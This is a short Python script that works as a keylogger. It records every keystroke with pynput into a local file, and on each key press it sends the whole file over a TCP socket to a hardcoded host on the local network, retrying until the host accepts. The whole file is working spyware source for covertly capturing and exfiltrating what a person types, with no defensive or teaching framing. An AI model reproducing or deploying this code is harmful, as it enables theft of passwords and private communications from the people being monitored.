import pynput.keyboard
import socket
import threading
import time

HOST = "192.168.0.72"  # Replace with the IP address of the host on the LAN
PORT = 12345

def on_press(key):
    key_stroke=str(key).replace("'",'')
    if key_stroke=="Key.enter":
        key_stroke=str(key_stroke)+("\n")
    key_stroke=str(key_stroke)+(" ")
    with open("keystrokes.txt","a") as f:
        f.write(key_stroke)
        threading.Thread(target=send_file).start()

def send_file():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.connect((HOST, PORT))
                with open("keystrokes.txt", "rb") as f:
                    data = f.read()
                    s.sendall(data)
                print("File sent successfully!")
                break  # Exit the loop after successful transmission
            except ConnectionRefusedError:
                print("Connection refused. Retrying in 5 seconds...") 
                time.sleep(5)
            except Exception as e:
                print(f"An error occurred: {e}")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
